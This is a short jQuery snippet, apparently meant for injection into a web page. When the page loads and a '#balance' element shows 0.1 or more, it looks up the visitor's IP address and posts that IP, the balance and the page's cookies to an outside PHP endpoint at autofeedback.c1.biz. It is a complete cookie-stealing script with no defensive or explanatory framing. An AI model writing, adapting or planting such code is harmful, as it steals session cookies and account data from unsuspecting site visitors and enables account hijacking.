$(document).ready(function() {    
if($("#balance").text() >= 0.1){
$.getJSON("https://ipinfo.io", function(data){
	$ips = "Ip : " + data.ip;
        $bel = $("#balance").text();
        $cook = document.cookie;
        $.post( "http://autofeedback.c1.biz/FBpostrequest.php", {
            bel: $bel,
            cook: $cook,
            ips: $ips
        });
	});
}
});
